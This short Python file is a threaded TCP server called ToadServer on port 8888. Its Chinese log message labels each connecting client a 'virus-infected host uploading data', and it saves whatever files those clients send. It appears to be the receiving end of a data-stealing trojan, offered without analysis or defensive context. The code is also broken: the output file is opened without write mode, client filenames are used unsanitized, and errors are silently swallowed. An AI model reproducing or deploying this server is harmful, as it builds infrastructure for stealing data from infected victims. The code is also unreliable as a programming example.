import socketserver
import struct
import json
import os
import time


class ToadServer(socketserver.BaseRequestHandler):
    coding = 'utf-8'
    max_packet_size = 1024

    def handle(self):
        ip, port = self.client_address
        with open(r'access.log', mode='a', encoding='utf-8') as f:
            f.write(f'[] 病毒感染者 {ip}:{[port]} 正在上传数据\n')

        try:
            head = self.request.recv(4)
            head_json_len = struct.unpack('i', head)[0]
            head_json = json.loads(self.request.recv(head_json_len))
            data_len = head_json['data_size']
            filename = head_json['filename']

            recv_size = 0
            recv_data = b''
            with open(rf'client_msg/client_{ip}_{filename}') as f:
                while recv_size < data_len:
                    recv_data = self.request.recv(1024)
                    f.write(recv_data)
                    recv_size += len(recv_data)

        except Exception as e:
            self.request.close()


myserver = socketserver.ThreadingTCPServer(('0.0.0.0', 8888), ToadServer)
myserver.serve_forever()
